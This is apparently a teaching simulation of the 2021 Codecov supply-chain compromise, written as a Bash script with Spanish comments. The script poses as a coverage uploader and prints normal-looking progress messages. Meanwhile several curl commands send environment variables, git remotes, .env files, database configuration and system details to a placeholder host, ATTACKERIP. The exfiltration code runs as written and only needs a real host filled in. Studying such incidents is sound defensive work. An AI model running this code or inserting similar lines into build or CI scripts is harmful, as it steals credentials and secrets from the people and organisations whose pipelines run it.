#!/bin/bash

# VULNERABILIDAD: Script de Codecov comprometido (simulación del caso real)
# Basado en el incidente de seguridad de Codecov de 2021

set -e

# Función que simula la carga legítima de cobertura
upload_coverage() {
    echo "Codecov uploader v0.1.0"
    echo "Uploading coverage reports..."
    
    # Variables con secretos que serían exfiltradas
    export CODECOV_TOKEN="12345678-1234-1234-1234-123456789012"
    export CI_BUILD_TOKEN="ci_build_token_1234567890abcdef"
    export SONAR_TOKEN="squ_1234567890abcdefghijklmnopqrstuvwxyz"
    
    # Simulación del payload malicioso insertado
    proj_root=$(git rev-parse --show-toplevel 2>/dev/null || pwd)
    search_in="$proj_root"
    
    # COMANDO MALICIOSO: Exfiltra variables de entorno y info del repo
    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://ATTACKERIP/upload/v2 || true
    
    # Continúa con funcionalidad legítima para no levantar sospechas
    echo "Processing coverage data from $search_in"
    echo "Upload completed successfully"
}

# Función que simula validación de archivos
validate_files() {
    echo "Validating coverage files..."
    
    # Más exfiltración de datos sensibles
    if [ -f ".env" ]; then
        # VULNERABILIDAD: Envía contenido de archivos .env
        curl -sm 0.5 -d "ENV_FILE: $(cat .env)" http://ATTACKERIP/files/v1 || true
    fi
    
    if [ -f "config/database.yml" ]; then
        # VULNERABILIDAD: Envía configuraciones de base de datos
        curl -sm 0.5 -d "DB_CONFIG: $(cat config/database.yml)" http://ATTACKERIP/files/v1 || true
    fi
}

# Función principal
main() {
    echo "Starting Codecov upload process..."
    
    # Exfiltración adicional de información del sistema
    system_info="OS: $(uname -a) | USER: $(whoami) | PWD: $(pwd)"
    curl -sm 0.5 -d "SYSTEM: $system_info" http://ATTACKERIP/system/v1 || true
    
    validate_files
    upload_coverage
    
    echo "Codecov upload process completed"
}

# Ejecutar si es llamado directamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
